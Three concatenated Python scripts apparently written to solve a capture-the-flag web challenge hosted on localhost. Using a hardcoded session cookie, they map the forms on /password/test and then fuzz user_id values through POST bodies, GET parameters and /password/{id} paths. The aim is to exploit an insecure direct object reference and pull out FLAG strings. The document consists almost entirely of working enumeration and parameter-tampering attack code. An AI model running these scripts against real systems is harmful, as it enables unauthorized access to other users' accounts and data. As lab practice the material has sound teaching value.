import requests
import re

base_url = "http://127.0.0.1:32933"
session_cookie = "session=eyJ1c2VyX2lkIjoxMDAzMn0.ac0IYA.qF_Br3NgazEdjAfxvNTyRVE9Cko"

headers = {
    'Cookie': session_cookie,
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Get the full form structure
print("[+] Analyzing form structure on /password/test...")
resp = requests.get(f"{base_url}/password/test", headers=headers)

# Extract all input fields
inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', resp.text)
hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*>', resp.text)
non_hidden = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']+)["\'][^>]*>', resp.text)

print(f"[+] All input names: {inputs}")
print(f"[+] Hidden inputs: {hidden_inputs}")
print(f"[+] Input value pairs: {non_hidden}")

# Get the full form HTML
form = re.findall(r'<form.*?</form>', resp.text, re.DOTALL)
if form:
    print(f"\n[+] Full form HTML:\n{form[0]}")

# Also check the base page with authenticated session
print("\n[+] Accessing / with session...")
base_resp = requests.get(base_url + "/", headers=headers)
print(f"[+] Status: {base_resp.status_code}, Length: {len(base_resp.text)}")
if base_resp.status_code == 200:
    # Extract links
    links = re.findall(r'href=["\']([^"\']+)["\']', base_resp.text)
    print(f"[+] Links found: {links}")
import requests
import re

base_url = "http://127.0.0.1:32933"
session_cookie = "session=eyJ1c2VyX2lkIjoxMDAzMn0.ac0IYA.qF_Br3NgazEdjAfxvNTyRVE9Cko"

headers = {
    'Cookie': session_cookie,
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

print("[+] Fuzzing POST /password/test with different user_id values...")
print("=" * 50)

# Baseline - current user_id
baseline_data = {'username': 'test', 'user_id': '10032', 'password': 'test'}
baseline = requests.post(f"{base_url}/password/test", data=baseline_data, headers=headers)
print(f"[BASELINE] user_id=10032: Status={baseline.status_code}, Length={len(baseline.text)}")

# Fuzz user_id from 10000 to 10050
print("\n[+] Testing sequential user_ids (10000-10050)...")
for user_id in range(10000, 10051):
    data = {'username': 'test', 'user_id': str(user_id), 'password': 'test'}
    resp = requests.post(f"{base_url}/password/test", data=data, headers=headers)
    
    # Check for differences
    if resp.status_code != baseline.status_code or len(resp.text) != len(baseline.text):
        print(f"\n[!] ANOMALY at user_id={user_id}")
        print(f"    Status: {resp.status_code} | Length: {len(resp.text)}")
        print(f"    Response: {resp.text[:500]}")
        
        # Check for FLAG pattern
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"    [!] FLAGS FOUND: {flags}")
    
    # Check every response for FLAG pattern regardless of size
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"\n[!] FLAG FOUND at user_id={user_id}: {flags}")
        print(f"    Response: {resp.text}")

print("\n[+] Testing low-range user_ids (1-200)...")
for user_id in range(1, 201):
    data = {'username': 'test', 'user_id': str(user_id), 'password': 'test'}
    resp = requests.post(f"{base_url}/password/test", data=data, headers=headers)
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"\n[!] FLAG FOUND at user_id={user_id}: {flags}")
        print(f"    Response: {resp.text}")
    
    if user_id % 50 == 0:
        print(f"[Progress] Tested {user_id}/200")

print("\n[+] Fuzzing complete!")
import requests
import re

base_url = "http://127.0.0.1:32933"
session_cookie = "session=eyJ1c2VyX2lkIjoxMDAzMn0.ac0IYA.qF_Br3NgazEdjAfxvNTyRVE9Cko"

headers = {
    'Cookie': session_cookie,
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# The first step is POST to / with just username
print("[+] Testing POST / (step 1) with different user_id values...")

# Test adding user_id as extra parameter to first step
for user_id in ['10031', '10032', '10033', '1', '9999']:
    data = {'username': 'test', 'user_id': user_id}
    resp = requests.post(base_url + "/", data=data, headers=headers, allow_redirects=True)
    print(f"[+] user_id={user_id}: Status={resp.status_code}, Length={len(resp.text)}, URL={resp.url}")
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"    [!] FLAGS FOUND: {flags}")

# Now test GET parameters with id-based names
print("\n[+] Testing GET /password/test with id parameters...")
id_params = ['id', 'user_id', 'user', 'account_id', 'userid', 'uid']

for param in id_params:
    for val in ['10031', '10032', '10033', '1', '2']:
        url = f"{base_url}/password/test?{param}={val}"
        resp = requests.get(url, headers=headers)
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[!] FLAG FOUND: {param}={val} -> {flags}")

# Try accessing /password/{id} with numeric values
print("\n[+] Testing GET /password/{numeric_id}...")
for i in range(1, 50):
    url = f"{base_url}/password/{i}"
    resp = requests.get(url, headers=headers)
    size = len(resp.text)
    print(f"[+] /password/{i}: Status={resp.status_code}, Size={size}")
    
    if size != 1287 and size != 1418:  # Different from known patterns
        print(f"    [!] Different response size!")
        print(f"    Response: {resp.text[:500]}")
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"    [!] FLAGS FOUND: {flags}")
        print(f"    Full response: {resp.text}")
